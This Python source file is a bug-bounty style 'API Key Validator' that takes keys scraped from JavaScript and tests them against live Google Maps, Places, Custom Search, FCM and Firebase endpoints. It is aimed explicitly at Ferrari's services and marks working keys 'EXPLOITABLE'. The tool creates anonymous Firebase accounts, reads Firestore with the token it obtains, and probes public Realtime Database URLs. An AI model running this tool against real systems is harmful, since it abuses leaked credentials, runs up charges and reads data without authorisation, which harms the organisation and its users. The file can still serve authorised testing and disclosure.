#!/usr/bin/env python3
"""
API Key Validator — Test if discovered API keys are active & exploitable
=========================================================================
Tests discovered keys against their respective APIs to determine:
  - Is the key active?
  - What permissions does it have?
  - Can an attacker abuse it?

Supports: Google Maps, Firebase, AWS, Slack, Stripe, etc.

Usage:
  python3 modules/api_key_validator.py --key AIzaSyXXXXXX --type google
  python3 modules/api_key_validator.py --file js_secrets.txt
"""

import argparse
import json
import os
import sys
from datetime import datetime

import requests
import urllib3
from colorama import Fore, Style, init

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = f"""
{Fore.GREEN}╔══════════════════════════════════════════════════╗
║  {Fore.WHITE}API KEY VALIDATOR — Is it exploitable?{Fore.GREEN}           ║
╚══════════════════════════════════════════════════╝{Style.RESET_ALL}
"""


class APIKeyValidator:
    def __init__(self, output_dir=None):
        self.results = []
        if output_dir:
            self.output_dir = output_dir
        else:
            self.output_dir = os.path.join(
                os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                "output", "api_key_validation"
            )
        os.makedirs(self.output_dir, exist_ok=True)

    def log(self, msg, level="info"):
        colors = {
            "info": Fore.CYAN, "success": Fore.GREEN,
            "warning": Fore.YELLOW, "error": Fore.RED,
            "exploitable": Fore.RED, "safe": Fore.GREEN
        }
        color = colors.get(level, Fore.WHITE)
        print(f"  {color}[{level.upper()}]{Style.RESET_ALL} {msg}")

    # ===== GOOGLE API KEY VALIDATION =====
    def validate_google_maps_key(self, api_key):
        """Test Google API key against multiple Google APIs."""
        self.log(f"Testing Google API Key: {api_key[:20]}...", "info")
        results = {"key": api_key, "type": "Google API Key", "services": []}

        # Test APIs (from cheapest to most expensive if abused)
        google_apis = [
            {
                "name": "Maps Static API",
                "url": f"https://maps.googleapis.com/maps/api/staticmap?center=45.4408,12.3155&zoom=13&size=600x300&key={api_key}",
                "check": lambda r: r.status_code == 200 and "image" in r.headers.get("Content-Type", ""),
                "impact": "Attacker can rack up billing charges on Ferrari's account"
            },
            {
                "name": "Maps Directions API",
                "url": f"https://maps.googleapis.com/maps/api/directions/json?origin=Maranello&destination=Rome&key={api_key}",
                "check": lambda r: r.status_code == 200 and "routes" in r.text,
                "impact": "API abuse, billing charges"
            },
            {
                "name": "Maps Geocoding API",
                "url": f"https://maps.googleapis.com/maps/api/geocode/json?address=Ferrari+Maranello&key={api_key}",
                "check": lambda r: r.status_code == 200 and "results" in r.text and "REQUEST_DENIED" not in r.text,
                "impact": "API abuse, billing charges"
            },
            {
                "name": "Places API",
                "url": f"https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Ferrari&inputtype=textquery&key={api_key}",
                "check": lambda r: r.status_code == 200 and "REQUEST_DENIED" not in r.text,
                "impact": "API abuse, billing charges"
            },
            {
                "name": "Custom Search API",
                "url": f"https://www.googleapis.com/customsearch/v1?key={api_key}&q=test",
                "check": lambda r: r.status_code == 200,
                "impact": "API abuse"
            },
            {
                "name": "FCM (Push Notifications)",
                "url": "https://fcm.googleapis.com/fcm/send",
                "method": "post",
                "headers": {"Authorization": f"key={api_key}", "Content-Type": "application/json"},
                "data": json.dumps({"registration_ids": ["test"]}),
                "check": lambda r: r.status_code != 401,
                "impact": "CRITICAL: Can send push notifications to Ferrari app users!"
            },
        ]

        for api in google_apis:
            try:
                if api.get("method") == "post":
                    resp = requests.post(
                        api["url"],
                        headers=api.get("headers", {}),
                        data=api.get("data", ""),
                        timeout=10
                    )
                else:
                    resp = requests.get(api["url"], timeout=10)

                is_valid = api["check"](resp)
                status = "EXPLOITABLE" if is_valid else "Restricted/Denied"
                color = "exploitable" if is_valid else "safe"

                results["services"].append({
                    "name": api["name"],
                    "status": status,
                    "http_code": resp.status_code,
                    "impact": api["impact"] if is_valid else "N/A",
                })

                if is_valid:
                    self.log(f"  ✓ {api['name']}: {Fore.RED}EXPLOITABLE{Style.RESET_ALL} — {api['impact']}", "exploitable")
                else:
                    self.log(f"  ✗ {api['name']}: Restricted", "safe")

            except Exception as e:
                results["services"].append({
                    "name": api["name"],
                    "status": "Error",
                    "error": str(e)
                })

        return results

    # ===== FIREBASE VALIDATION =====
    def validate_firebase_key(self, api_key, project_id=None):
        """Test Firebase API key and check for misconfigured rules."""
        self.log(f"Testing Firebase Key: {api_key[:20]}...", "info")
        results = {"key": api_key, "type": "Firebase API Key", "checks": []}

        # If we know the project ID from the key
        if not project_id:
            # Try to extract from common patterns
            self.log("  Note: Provide --firebase-project for deeper checks", "warning")

        # Test Firebase Auth API (sign up anonymously)
        try:
            resp = requests.post(
                f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={api_key}",
                headers={"Content-Type": "application/json"},
                data=json.dumps({"returnSecureToken": True}),
                timeout=10
            )

            if resp.status_code == 200 and "idToken" in resp.text:
                results["checks"].append({
                    "name": "Anonymous Sign-up",
                    "status": "EXPLOITABLE",
                    "impact": "Can create accounts anonymously, potential data access"
                })
                self.log(f"  ✓ Anonymous signup: {Fore.RED}ALLOWED{Style.RESET_ALL} — Can create accounts!", "exploitable")

                # If we got a token, try to access Firestore/RTDB
                token = resp.json().get("idToken", "")
                if token and project_id:
                    # Try Firestore
                    fs_resp = requests.get(
                        f"https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/",
                        headers={"Authorization": f"Bearer {token}"},
                        timeout=10
                    )
                    if fs_resp.status_code == 200:
                        results["checks"].append({
                            "name": "Firestore Read",
                            "status": "EXPLOITABLE",
                            "impact": "CRITICAL: Can read Firestore database!"
                        })
                        self.log(f"  ✓ Firestore: {Fore.RED}READABLE{Style.RESET_ALL}", "exploitable")
            else:
                error = resp.json().get("error", {}).get("message", "Unknown")
                results["checks"].append({
                    "name": "Anonymous Sign-up",
                    "status": "Restricted",
                    "note": error
                })
                self.log(f"  ✗ Anonymous signup: Restricted ({error})", "safe")

        except Exception as e:
            results["checks"].append({"name": "Firebase Auth", "status": "Error", "error": str(e)})

        return results

    # ===== MAIN VALIDATION RUNNER =====
    def validate_key(self, key, key_type=None):
        """Auto-detect and validate a key."""
        # Auto-detect key type
        if not key_type:
            if key.startswith("AIza"):
                key_type = "google"
            elif key.startswith("sk_live_"):
                key_type = "stripe"
            elif key.startswith("xox"):
                key_type = "slack"
            elif key.startswith("AKIA"):
                key_type = "aws"
            elif key.startswith("ghp_"):
                key_type = "github"
            else:
                key_type = "google"  # Default guess for AIza* keys

        if key_type == "google":
            return self.validate_google_maps_key(key)
        elif key_type == "firebase":
            return self.validate_firebase_key(key)
        else:
            self.log(f"  Key type '{key_type}' validation not yet implemented", "warning")
            return {"key": key, "type": key_type, "status": "Not validated"}

    def validate_from_file(self, filepath):
        """Parse secrets file and validate found keys."""
        self.log(f"Loading keys from: {filepath}", "info")

        keys_found = set()
        with open(filepath, "r") as f:
            for line in f:
                # Look for Google API keys (AIza pattern)
                if "AIza" in line:
                    import re
                    matches = re.findall(r'AIza[0-9A-Za-z\-_]{35}', line)
                    for match in matches:
                        keys_found.add(("google", match))

                # Look for Firebase URLs
                if "firebaseio.com" in line:
                    matches = re.findall(r'https?://([a-zA-Z0-9-]+)\.firebaseio\.com', line)
                    for match in matches:
                        keys_found.add(("firebase_project", match))

        self.log(f"Found {len(keys_found)} unique keys to validate", "info")
        print()

        for key_type, key in keys_found:
            if key_type == "google":
                result = self.validate_google_maps_key(key)
            elif key_type == "firebase_project":
                # Try to check Firebase RTDB rules
                self.log(f"Firebase project found: {key}", "info")
                try:
                    resp = requests.get(f"https://{key}.firebaseio.com/.json", timeout=10)
                    if resp.status_code == 200:
                        result = {
                            "key": f"{key}.firebaseio.com",
                            "type": "Firebase RTDB",
                            "status": "EXPLOITABLE",
                            "impact": "CRITICAL: Firebase database is publicly readable!"
                        }
                        self.log(f"  {Fore.RED}CRITICAL: Firebase DB {key} is PUBLIC!{Style.RESET_ALL}", "exploitable")
                    elif resp.status_code == 401:
                        result = {"key": key, "type": "Firebase RTDB", "status": "Auth required"}
                        self.log(f"  ✗ Firebase DB {key}: Auth required", "safe")
                    else:
                        result = {"key": key, "type": "Firebase RTDB", "status": f"HTTP {resp.status_code}"}
                except Exception:
                    result = {"key": key, "type": "Firebase RTDB", "status": "Error"}
            else:
                result = self.validate_key(key, key_type)

            self.results.append(result)
            print()

    def save_results(self):
        """Save validation results."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = os.path.join(self.output_dir, f"api_key_validation_{timestamp}.json")

        with open(output_file, "w") as f:
            json.dump({
                "timestamp": datetime.now().isoformat(),
                "results": self.results
            }, f, indent=2)

        self.log(f"\nResults saved: {output_file}", "info")

        # Print exploitable keys summary
        exploitable = []
        for result in self.results:
            services = result.get("services", [])
            checks = result.get("checks", [])
            for item in services + checks:
                if item.get("status") == "EXPLOITABLE":
                    exploitable.append({
                        "key": result["key"][:25] + "...",
                        "service": item["name"],
                        "impact": item.get("impact", "")
                    })

        if exploitable:
            print(f"\n  {Fore.RED}{'='*50}")
            print(f"  EXPLOITABLE KEYS FOUND!")
            print(f"  {'='*50}{Style.RESET_ALL}")
            for e in exploitable:
                print(f"  → Key: {e['key']}")
                print(f"    Service: {e['service']}")
                print(f"    Impact: {e['impact']}")
                print()
            print(f"  {Fore.YELLOW}These are reportable! Answer: 'An attacker can abuse")
            print(f"  these keys to generate charges on Ferrari's billing account")
            print(f"  or access their cloud services.'{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(description="API Key Validator — Test if keys are exploitable")
    parser.add_argument("--key", "-k", help="Single API key to test")
    parser.add_argument("--type", "-t", choices=["google", "firebase", "aws", "slack", "stripe"],
                       help="Key type (auto-detected if not specified)")
    parser.add_argument("--file", "-f", help="Secrets file to parse and validate")
    parser.add_argument("--firebase-project", help="Firebase project ID for deeper checks")
    parser.add_argument("--output", "-o", help="Output directory")

    args = parser.parse_args()
    print(BANNER)

    if not args.key and not args.file:
        print(f"{Fore.RED}[ERROR] Provide --key or --file{Style.RESET_ALL}")
        sys.exit(1)

    validator = APIKeyValidator(output_dir=args.output)

    if args.key:
        result = validator.validate_key(args.key, args.type)
        validator.results.append(result)
    elif args.file:
        validator.validate_from_file(args.file)

    validator.save_results()


if __name__ == "__main__":
    main()
